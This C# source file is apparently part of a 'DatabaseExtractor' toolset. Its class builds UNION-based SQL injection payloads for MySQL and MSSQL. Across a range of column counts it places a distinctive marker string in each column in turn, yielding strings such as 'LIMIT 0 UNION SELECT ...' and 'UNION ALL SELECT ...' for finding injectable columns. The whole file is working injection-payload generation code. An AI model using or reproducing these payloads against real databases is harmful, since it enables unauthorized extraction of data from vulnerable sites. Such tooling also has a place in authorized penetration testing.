using System.Collections.Generic;
using ToolSet.DatabaseExtractorCode.DBExtractor;

namespace ToolSet.DatabaseExtractorCode.QueryConstructor
{
   public class UnionQueryConstructor
   {
      private readonly List<string> _finalUnionQueries;

      public UnionQueryConstructor()
      {
         _finalUnionQueries = new List<string>();
      }

      public List<string> CreateQueries(int minValue, int maxValue, DataBaseType dataBaseType)
      {
         if (minValue < maxValue)
         {
            for (int x = minValue; x < maxValue; x++)
            {
               var basis = new string[x];

               for (int y = 0; y < basis.Length; y++)
                  basis[y] = "NULL,";

               if (dataBaseType == DataBaseType.Mssql)
                  UnionQueryMssql(basis);
               else
                  UnionQueryMySql(basis);
            }
         }
         return _finalUnionQueries;
      }

      private void UnionQueryMySql(string[] basis)
      {
         // No usages?
         //var zahl = new Random();

         const int a = 12;
         const int b = 34;
         const int c = 4321;

         for (int z = 0; z < basis.Length; z++)
         {
            basis[z] = "CONCAT(0x5f5f5f6c6c," + a + "," + b + c + ",0x6c6c5f5f5f),";
            AssembleMySql(basis);
            basis[z] = "NULL,";
         }
      }

      private void UnionQueryMssql(string[] basis)
      {
         // No usages?
         //var zahl = new Random();

         const int a = 1234;
         const int b = 4321;

         for (int y = 0; y < basis.Length; y++)
         {
            basis[y] = "Char(95)+Char(95)+Char(95)+Char(108)+Char(108)+CAST(" + a + b +
                       " as varchar)+Char(108)+Char(108)+Char(95)+Char(95)+Char(95),";
            AssembleMssql(basis);
            basis[y] = "NULL,";
         }
      }

      private void AssembleMySql(string[] basis)
      {
         string query = string.Empty;

         foreach (string element in basis)
            query = query + element;

         _finalUnionQueries.Add("LIMIT 0 UNION SELECT " + query.Remove(query.LastIndexOf(",")));
      }

      private void AssembleMssql(string[] basis)
      {
         string query = string.Empty;

         foreach (string element in basis)
            query = query + element;

         _finalUnionQueries.Add("UNION ALL SELECT " + query.Remove(query.LastIndexOf(",")));
      }
   }
}